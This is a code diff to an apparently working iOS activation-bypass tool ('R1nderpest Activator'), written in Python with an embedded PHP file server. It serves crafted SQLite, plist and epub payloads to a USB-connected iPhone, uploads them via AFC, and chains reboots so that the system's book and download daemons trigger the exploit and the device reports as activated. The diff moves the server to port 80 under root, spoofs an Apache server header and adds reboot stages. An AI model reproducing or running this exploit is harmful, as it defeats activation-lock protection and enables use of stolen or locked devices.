@@ -64,7 +64,7 @@ class LocalServer:
     Embedded HTTP server to serve the generated payloads to the device
     over the local network (Wi-Fi).
     """
-    def __init__(self, port=8081):
+    def __init__(self, port=80):
         self.port = port
         self.serve_dir = tempfile.mkdtemp(prefix="ios_activation_")
         self.local_ip = self.get_local_ip()
@@ -108,9 +108,25 @@ error_log("Request: " . $_SERVER["REQUEST_URI"]);
 
 if (file_exists($file) && !is_dir($file)) {
     $ext = pathinfo($file, PATHINFO_EXTENSION);
-    if (in_array($ext, ['png', 'sqlitedb', 'plist', 'epub'])) {
+    
+    header('Server: Apache/2.4.41 (Unix)');
+    
+    header('Content-Length: ' . filesize($file));
+    header('Accept-Ranges: bytes');
+    header('Connection: close');
+    
+    header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
+    header('Cache-Control: post-check=0, pre-check=0', false);
+    header('Pragma: no-cache');
+    
+    if ($ext === 'epub') {
+        header('Content-Type: application/epub+zip');
+    } elseif ($ext === 'plist') {
+        header('Content-Type: application/x-apple-plist');
+    } elseif (in_array($ext, ['png', 'sqlitedb'])) {
         header('Content-Type: application/octet-stream');
     }
+    
     readfile($file);
     exit;
 }
@@ -336,7 +352,6 @@ class PayloadGenerator:
                 dl_sql_content = f.read()
             
             # Replace placeholders in SQL (new format from working hanakim3945 DB)
-            # The template has URLs like: https://your_domain_here/fileprovider.php?type=sqlite
             server_base = f"http://{local_server.local_ip}:{local_server.port}"
             
             # Replace URL placeholders with our server URLs
@@ -348,7 +363,6 @@ class PayloadGenerator:
             # Replace hardcoded GUID from template if present
             dl_sql_content = dl_sql_content.replace('3DBBBC39-F5BA-4333-B40C-6996DE48F91C', guid)
 
-            # Legacy fallbacks (keep for compatibility with older templates)
             # dl_sql_content = dl_sql_content.replace('https://google.com', bl_url) # Legacy placeholder
             dl_sql_content = dl_sql_content.replace('GOODKEY', guid)
             
@@ -436,15 +450,13 @@ class BypassAutomation:
         Poll until device services are fully ready by checking battery info.
         This is more thorough than just checking connection.
         """
-        self.log("Waiting for device services to be ready...", "detail")
+        # Silent check for services
         start_time = time.time()
         while time.time() - start_time < timeout:
             code, _, _ = self._run_cmd(["ideviceinfo", "-q", "com.apple.mobile.battery"], timeout=5)
             if code == 0:
-                self.log("Device services ready.", "success")
                 return True
             time.sleep(poll_interval)
-        self.log("Device services not fully ready, continuing anyway...", "warn")
         return False
 
     def _parse_device_path(self, path):
@@ -513,7 +525,7 @@ class BypassAutomation:
         Reboot the device and wait for it to reconnect using polling.
         First waits for disconnect, then waits for reconnect.
         """
-        self.log("Initiating device reboot...", "info")
+        self.log("Rebooting...", "info")
         self._run_cmd(["pymobiledevice3", "diagnostics", "restart"])
         
         # Wait for device to disconnect (indicates reboot started)
@@ -767,7 +779,7 @@ class BypassAutomation:
             while True:
                 line = f.readline()
                 if line:
-                    print(f"{Style.DIM}      [SERVER LOG] {line.strip()}{Style.RESET}")
+                    print(f"{Style.DIM}      [SERVER] {line.strip()}{Style.RESET}")
                 else:
                     time.sleep(0.5)
                 
@@ -776,7 +788,66 @@ class BypassAutomation:
 
     def run(self):
         os.system('clear')
-        print(f"{Style.BOLD}{Style.MAGENTA}R1nderpest Activator{Style.RESET}\n")
+        
+        title_lines = [
+            r"██████╗░░░███╗░░███╗░░██╗██████╗░███████╗██████╗░██████╗░███████╗░██████╗████████╗",
+            r"██╔══██╗░████║░░████╗░██║██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔════╝╚══██╔══╝",
+            r"██████╔╝██╔██║░░██╔██╗██║██║░░██║█████╗░░██████╔╝██████╔╝█████╗░░╚█████╗░░░░██║░░░",
+            r"██╔══██╗╚═╝██║░░██║╚████║██║░░██║██╔══╝░░██╔══██╗██╔═══╝░██╔══╝░░░╚═══██╗░░░██║░░░",
+            r"██║░░██║███████╗██║░╚███║██████╔╝███████╗██║░░██║██║░░░░░███████╗██████╔╝░░░██║░░░",
+            r"╚═╝░░╚═╝╚══════╝╚═╝░░╚══╝╚═════╝░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚══════╝╚═════╝░░░░╚═╝░░░"
+        ]
+        
+        # Pre-calculate colored characters for gradient (Red -> Blue)
+        colored_lines = []
+        start_color = (255, 0, 0)  # Red
+        end_color = (0, 0, 255)    # Blue
+        
+        for line in title_lines:
+            colored_chars = []
+            length = len(line)
+            for i, char in enumerate(line):
+                ratio = i / max(1, length - 1)
+                r = int(start_color[0] * (1 - ratio) + end_color[0] * ratio)
+                g = int(start_color[1] * (1 - ratio) + end_color[1] * ratio)
+                b = int(start_color[2] * (1 - ratio) + end_color[2] * ratio)
+                colored_chars.append(f"\033[38;2;{r};{g};{b}m{char}")
+            colored_lines.append(colored_chars)
+
+        # Prepare subtitle with same gradient
+        subtitle = "By gliddd4, https://github.com/gliddd4/R1nderpest"
+        subtitle_chars = []
+        sub_len = len(subtitle)
+        for i, char in enumerate(subtitle):
+            ratio = i / max(1, sub_len - 1)
+            r = int(start_color[0] * (1 - ratio) + end_color[0] * ratio)
+            g = int(start_color[1] * (1 - ratio) + end_color[1] * ratio)
+            b = int(start_color[2] * (1 - ratio) + end_color[2] * ratio)
+            subtitle_chars.append(f"\033[38;2;{r};{g};{b}m{char}")
+
+        max_width = max(len(line) for line in title_lines)
+        
+        # Hide cursor
+        print("\033[?25l", end="")
+        
+        try:
+            for i in range(1, max_width + 1):
+                for line_chars in colored_lines:
+                    print("".join(line_chars[:i]) + "\033[0m")
+                
+                if i < max_width:
+                    time.sleep(0.01)
+                    print(f"\033[{len(title_lines)}A", end="")
+        finally:
+            # Show cursor
+            print("\033[?25h", end="")
+
+        # Animate subtitle
+        for char in subtitle_chars:
+            print(char, end="", flush=True)
+            time.sleep(0.05)
+        print("\033[0m")
+        print(f"{Style.RESET}\n")
         
         self.verify_dependencies()
         self.server.start() # Start HTTP server
@@ -834,6 +905,12 @@ class BypassAutomation:
         for f in os.listdir(self.server.serve_dir):
             print(f"{Style.DIM}    - {f}{Style.RESET}")
 
+        # Pre-Deployment Reboot (Ensure clean state)
+        self.log("Rebooting Device (Pre-Deployment)...", "step")
+        if not self.reboot_device_and_wait(timeout=120):
+            self.log("Failed to reconnect after pre-deployment reboot", "error")
+            sys.exit(1)
+
         # 4. Upload
         self.log("Uploading...", "step")
         target_base = "/Downloads/downloads.28.sqlitedb"
@@ -864,7 +941,6 @@ class BypassAutomation:
         print(f"Server IP: {self.server.local_ip}")
         
         # Wait for filesystem sync by polling device readiness instead of hard 30s sleep
-        self.log("Verifying filesystem sync before reboot...", "info")
         self.wait_for_device_services_ready(timeout=30, poll_interval=2)
 
         # --- 6. Reboot Sequence (Matching A12 2.sh EXACTLY) ---
@@ -879,13 +955,12 @@ class BypassAutomation:
         # 8. Final Reboot
         
         # First Reboot
-        self.log("Rebooting (First Reboot)...", "step")
+        self.log("Rebooting Device (Stage 1/3)...", "step")
         if not self.reboot_device_and_wait(timeout=120):
             self.log("Failed to reconnect after First Reboot", "error")
             sys.exit(1)
 
         # Wait for system stabilization
-        self.log("Waiting for system stabilization...", "info")
         self.wait_for_device_services_ready(timeout=60, poll_interval=2)
         time.sleep(30)  # Match bash script's sleep 30 after reconnect
 
@@ -901,30 +976,58 @@ class BypassAutomation:
         self.log("iTunesMetadata.plist found - itunesstored processed the download!", "success")
 
         # Second Reboot (this triggers bookassetd to process BLDatabaseManager)
-        self.log("Rebooting (Second Reboot)...", "step")
+        self.log("Rebooting Device (Stage 2/3)...", "step")
         if not self.reboot_device_and_wait(timeout=120):
             self.log("Failed to reconnect after Second Reboot", "error")
             sys.exit(1)
         
         # Wait for system stabilization
-        self.log("Waiting for system stabilization...", "info")
         self.wait_for_device_services_ready(timeout=60, poll_interval=2)
         time.sleep(30)  # Match bash script
 
-        # NOTE: We do NOT open Books app! The system triggers bookassetd automatically
-        # after the reboot when itunesstored/bookassetd process the chain:
-        # downloads.28 -> BLDatabaseManager -> asset.epub
+        # --- NEW LOGIC: Check Files -> Move Plist -> Reboot -> Check Asset ---
 
-        # Monitor asset.epub (Exploit Trigger) - NO BOOKS APP LAUNCH NEEDED
+        # Check Files in iTunes_Control and Downloads
+        self.log("Checking file system state...", "step")
+        
+        self.log("Listing /iTunes_Control/iTunes:", "detail")
+        code, out, _ = self._run_cmd(["pymobiledevice3", "afc", "ls", "/iTunes_Control/iTunes"])
+        if code == 0:
+            files = [f for f in out.splitlines() if f not in ['.', '..', '']]
+            for f in files:
+                print(f"{Style.DIM}    - {f}{Style.RESET}")
+        
+        self.log("Listing /Downloads:", "detail")
+        code, out, _ = self._run_cmd(["pymobiledevice3", "afc", "ls", "/Downloads"])
+        if code == 0:
+            files = [f for f in out.splitlines() if f not in ['.', '..', '']]
+            for f in files:
+                print(f"{Style.DIM}    - {f}{Style.RESET}")
+
+        # Move iTunesMetadata.plist to Books
+        if not self.transfer_plist_to_books():
+            self.log("Failed to transfer iTunesMetadata.plist to Books (continuing anyway...)", "warn")
+
+        # Reboot 3 (Post-Transfer)
+        self.log("Rebooting Device (Stage 3/4)...", "step")
+        if not self.reboot_device_and_wait(timeout=120):
+            self.log("Failed to reconnect after Third Reboot", "error")
+            sys.exit(1)
+        
+        # Wait for system stabilization
+        self.wait_for_device_services_ready(timeout=60, poll_interval=2)
+        time.sleep(30)
+
+        # Monitor asset.epub (Exploit Trigger)
         self.log("Waiting for asset.epub (max 300s)...", "step")
         self.log("System will automatically trigger bookassetd - no manual action needed", "info")
         found_asset = False
         
-        # Wait up to 300s (matching A12 2.sh MAX_ASSET_WAIT_TIME)
+        # Wait up to 300s
         for i in range(60): # Check every 5s for 300s
             # Check /Books/asset.epub
             code, out, _ = self._run_cmd(["pymobiledevice3", "afc", "ls", "/Books"])
-            if "asset.epub" in out or "asset" in out: # Loose match as per bash script
+            if "asset.epub" in out or "asset" in out:
                  self.log("asset.epub detected!", "success")
                  found_asset = True
                  break
@@ -933,31 +1036,7 @@ class BypassAutomation:
             if i % 4 == 0 and i > 0:
                 elapsed = i * 5
                 self.log(f"Still waiting... ({elapsed}s/300s)", "info")
-                
-                # Check /Books
-                code, out, _ = self._run_cmd(["pymobiledevice3", "afc", "ls", "/Books"])
-                files = [f for f in out.splitlines() if f not in ['.', '..', '']]
-                print(f"{Style.DIM}      [DEBUG] /Books: {files}{Style.RESET}")
-
-                # Check /Downloads (To see if temp files are stuck there)
-                code_dl, out_dl, _ = self._run_cmd(["pymobiledevice3", "afc", "ls", "/Downloads"])
-                files_dl = [f for f in out_dl.splitlines() if f not in ['.', '..', '']]
-                if files_dl:
-                    print(f"{Style.DIM}      [DEBUG] /Downloads: {files_dl}{Style.RESET}")
-                
-                # Check if server is still alive
-                if self.server.process.poll() is not None:
-                    print(f"\n{Style.RED}[!] PHP Server has crashed! Exit code: {self.server.process.returncode}{Style.RESET}")
-                    print(f"{Style.RED}[!] Check php_server.log for details.{Style.RESET}")
-                    print(f"{Style.YELLOW}[*] Attempting to restart server...{Style.RESET}")
-                    self.server.start()
-                
-                # Check if iTunesMetadata.plist is still there
-                code_meta, out_meta, _ = self._run_cmd(["pymobiledevice3", "afc", "ls", "/iTunes_Control/iTunes"])
-                if "iTunesMetadata.plist" not in out_meta:
-                     print(f"{Style.YELLOW}      [DEBUG] iTunesMetadata.plist MISSING from /iTunes_Control/iTunes!{Style.RESET}")
-                else:
-                     print(f"{Style.DIM}      [DEBUG] iTunesMetadata.plist present in /iTunes_Control/iTunes{Style.RESET}")
+                print(f"{Style.DIM}      [DEBUG] /Books content: {out.splitlines()}{Style.RESET}")
 
             time.sleep(5)
             print(f"{Style.DIM}.", end="", flush=True)
@@ -981,49 +1060,30 @@ class BypassAutomation:
             
         else:
             self.log("asset.epub NOT detected. Exploit might have failed.", "warn")
-            self.log("Attempting recovery path...", "warn")
 
-        # Cleanup Downloads
+        # Cleanup Downloads (NOW we delete the DBs)
         self.log("Cleaning up Downloads...", "detail")
         self._run_cmd(["pymobiledevice3", "afc", "rm", "/Downloads/downloads.28.sqlitedb"])
         self._run_cmd(["pymobiledevice3", "afc", "rm", "/Downloads/downloads.28.sqlitedb-shm"])
         self._run_cmd(["pymobiledevice3", "afc", "rm", "/Downloads/downloads.28.sqlitedb-wal"])
 
-        # Reboot 3 (Final)
-        self.log("Rebooting (Stage 3/3 - Final)...", "step")
+        # Reboot 4 (Final)
+        self.log("Rebooting Device (Stage 4/4 - Final)...", "step")
         if not self.reboot_device_and_wait(timeout=120):
             self.log("Failed to reconnect after final reboot", "error")
             sys.exit(1)
 
-        # Check Activation State with Retry
-        self.log("Checking Activation State (Smart Retry)...", "step")
+        # Check Activation State
+        self.log("Checking Activation State...", "step")
         
-        max_retries = 3
-        for attempt in range(max_retries):
-            self.log(f"Activation Check Attempt {attempt+1}/{max_retries}", "info")
-            
-            # Check loop using polling (up to 60s with 5s intervals = 12 attempts)
-            for i in range(12):
-                code, out, _ = self._run_cmd(["ideviceinfo", "-k", "ActivationState"])
-                state = out.strip()
-                print(f"  [{i+1}/12] State: {state}")
-                
-                if "Activated" in state:
-                    print(f"\n{Style.BOLD}{Style.GREEN}🎉 DEVICE ACTIVATED SUCCESSFULLY! 🎉{Style.RESET}")
-                    self._cleanup()
-                    return
-                time.sleep(5)
-            
-            if attempt < max_retries - 1:
-                self.log("Device not activated yet. Rebooting and retrying...", "warn")
-                if not self.reboot_device_and_wait(timeout=120):
-                    self.log("Failed to reconnect after retry reboot", "warn")
-                    continue
-                
-                # Wait for services to stabilize using polling
-                self.wait_for_device_services_ready(timeout=45, poll_interval=2)
-
-        self.log("Activation failed after all retries.", "error")
+        code, out, _ = self._run_cmd(["ideviceinfo", "-k", "ActivationState"])
+        state = out.strip()
+        print(f"  State: {state}")
+        
+        if "Activated" in state:
+            print(f"\n{Style.BOLD}{Style.GREEN}🎉 DEVICE ACTIVATED SUCCESSFULLY! 🎉{Style.RESET}")
+        else:
+            self.log("Activation failed.", "error")
         
         self._cleanup()
 
@@ -1155,6 +1215,10 @@ class MobileGestaltPatcher:
             print(f"{Style.YELLOW}[⚠] Warning: No suitable legacy pattern found.{Style.RESET}")
 
 if __name__ == "__main__":
+    if os.geteuid() != 0:
+        print(f"{Style.RED}Error: This script requires root privileges to run on port 80 (VPS Mode).{Style.RESET}")
+        print(f"{Style.YELLOW}Please run with: sudo python3 {sys.argv[0]}{Style.RESET}")
+        sys.exit(1)
     try:
         BypassAutomation().run()
     except KeyboardInterrupt:
